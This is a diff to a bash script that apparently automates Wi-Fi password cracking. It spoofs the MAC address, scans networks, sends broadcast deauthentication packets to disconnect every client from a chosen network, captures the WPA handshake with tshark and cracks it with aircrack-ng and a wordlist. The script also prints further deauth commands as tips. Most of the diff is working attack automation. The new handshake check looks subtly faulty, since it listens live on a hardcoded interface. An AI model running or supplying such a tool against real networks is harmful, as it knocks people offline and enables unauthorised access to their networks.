@@ -24,7 +24,7 @@ function anonymize_mac_address() {
 	ifconfig ${network_card} down && macchanger -a ${network_card} &>/dev/null
 	ifconfig ${network_card} up &>/dev/null
 	macaddress=$(macchanger -s ${network_card} | grep -i "Current" | xargs | cut -d ' ' -f '3-100')
-	echo -e "\n${good}[+]${nc} New MAC address: $macaddress"
+	gum style "New MAC address: $macaddress"
 	user_sleep
 }
 
@@ -91,7 +91,7 @@ function help_panel() {
 }
 
 function do_not_close_sign() {
-	gum style "Do not close the new terminal, the script will close it automagically later"
+	gum style --border-foreground="1" "Do not close the new terminal, the script will close it automagically later"
 }
 
 function user_sleep() {
@@ -102,6 +102,7 @@ function user_sleep() {
 function delete_temp_files() {
 	rm -rf airodump*
 	rm -rf capture_*
+	rm -rf "${handshake_file}"
 }
 
 function select_target_network() {
@@ -114,7 +115,7 @@ function select_target_network() {
 	airodump_xterm_pid=$!
 
 	do_not_close_sign
-	echo -e "${yellow}[*]${nc} Wait a few seconds and pause the scan with ${good}enter${nc}..."
+	echo -e "${yellow}[*]${nc} Wait a few seconds and pause the scan when your target appears"
 	wait_for_confirmation
 	kill -9 $airodump_xterm_pid
 	wait $airodump_xterm_pid &>/dev/null
@@ -138,10 +139,15 @@ function select_target_network() {
 	ssid="${target_network##*, }"
 	bssid="${target_network%%,*}"
 	channel="$(echo "$target_network" | awk -F', ' '{print $2}')"
-
-	echo -e "\n${good}[+]${nc} You choose ${yellow}${bssid}${nc} on channel ${yellow}${channel}${nc} with the name ${yellow}${ssid}${nc}"
-	rm -rf airodump*
 	handshake
+}
+
+function eapol_has_captured() {
+	handshake_file="handshake.txt"
+	tshark -i wlan0 -Y "eapol" -w - 2>/dev/null | tee "${handshake_file}" | grep -q "Message 1 of 4" &&
+		grep -q "Message 2 of 4" "${handshake_file}" &&
+		grep -q "Message 3 of 4" "${handshake_file}" &&
+		grep -q "Message 4 of 4" "${handshake_file}"
 }
 
 function handshake() {
@@ -150,11 +156,8 @@ function handshake() {
 	user_sleep
 	echo -e "\n${yellow}[*]${nc} A new terminal will be opened to show you the traffic of the network"
 	user_sleep
-	do_not_close_sign
-	user_sleep
-	xterm -hold -e "airodump-ng -c $channel -w "capture_${bssid}" --bssid "${bssid}" ${network_card}" &
+	xterm -hold -e "airodump-ng -c $channel -w capture_$bssid --bssid $bssid $network_card" &
 	airodump_filter_xterm_pid=$!
-
 	echo -e "\n${yellow}[*]${nc} A new terminal will be opened to send the deauth packets"
 	user_sleep
 	do_not_close_sign
@@ -163,32 +166,26 @@ function handshake() {
 	user_sleep
 	xterm -hold -e "aireplay-ng -0 5 -a ${bssid} -c ff:ff:ff:ff:ff:ff ${network_card}" &
 	aireplay_xterm_pid=$!
-
-	sleep 10 # Waiting deauthentication
+	gum spin --timeout=10s --title="Waiting deauthentication for 10 seconds..." sleep 10
 	kill -9 $aireplay_xterm_pid
 	wait $aireplay_xterm_pid &>/dev/null
 	echo -e "\n${green}[+]${nc} Signal for deauthenticate all clients sended"
 
 	handshake_wait=60
-	echo -e "\n${doing}[~]${nc} Waiting handshake for ${handshake_wait} seconds..."
+	gum spin --timeout=${handshake_wait}s --title="Waiting handshake for ${handshake_wait} seconds..." sleep ${handshake_wait}
 
-	sleep ${handshake_wait}
-
-	tshark -r capture_${bssid}-01.cap -Y "eapol" 1>handshake.txt 2>/dev/null
-
-	if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
+	if eapol_has_captured; then
 		echo -e "\n${good}[+]${nc} Handshake captured"
 		kill -9 $airodump_filter_xterm_pid
 		wait $airodump_filter_xterm_pid &>/dev/null
 	else
 		echo -e "\n${wrong}[-]${nc} Handshake could not be captured"
-		echo -e "\n${yellow}[*]${nc} You could wait until the handshake is captured or press ${ask}enter${nc} to continue"
+		echo -e "\n${yellow}[*]${nc} You could wait until the handshake is captured or press ${ask}any key${nc} to continue"
 		echo -e "\n${info}[·]${nc} TIP: You can try to see the clients and send the deauth packets to them using aireplay in another terminal: "
 		echo -e "${cmd}sudo aireplay-ng -0 5 -a ${bssid} -c client_mac_address ${network_card}"
 		echo -e "${cmd}sudo aireplay-ng -0 5 -a ${bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"
 		wait_for_confirmation
-		tshark -r capture_${bssid}-01.cap -Y "eapol" 1>handshake.txt 2>/dev/null
-		if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
+		if eapol_has_captured; then
 			echo -e "\n${good}[+]${nc} Handshake captured"
 			kill -9 $airodump_filter_xterm_pid
 			wait $airodump_filter_xterm_pid &>/dev/null
@@ -197,24 +194,21 @@ function handshake() {
 			kill -9 $airodump_filter_xterm_pid
 			wait $airodump_filter_xterm_pid &>/dev/null
 			echo -e "\n${wrong}[-]${nc} The failed captures will be deleted"
-			rm -rf capture_*
 			gum confirm "Do you want to try again? on the same network?" && handshake || gum confirm "Do you want to try again on another network?" && select_target_network
 		fi
 	fi
-	tshark -r capture_${bssid}-01.cap -Y "eapol" 1>handshake.txt 2>/dev/null
-	if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
-		mkdir -p handshakes
-		mv capture_* handshakes/
 
-		xterm -hold -e "aircrack-ng -w $wordlist_path handshakes/capture_${bssid}-01.cap" &
+	if eapol_has_captured; then
+		handshake_directory="handshakes"
+		mkdir -p ${handshake_directory}
+		mv capture_* ${handshake_directory}/
+
+		xterm -hold -e "aircrack-ng -w $wordlist_path ${handshake_directory}/capture_${bssid}-01.cap" &
 		aircrack_xterm_pid=$!
 		echo -e "\n${yellow}[*]${nc} Cracking handshake..."
 		echo -e "\n${yellow}[!]${nc} Remember to kill the process when you have the password"
-		echo -e "\n${yellow}[!]${nc} Use the following command: ${cmd}sudo kill -9 $aircrack_xterm_pid${nc}"
+		gum style "Use the following command: sudo kill -9 $aircrack_xterm_pid"
 	fi
-
-	rm -rf handshake.txt
-
 }
 
 function pmkid() {
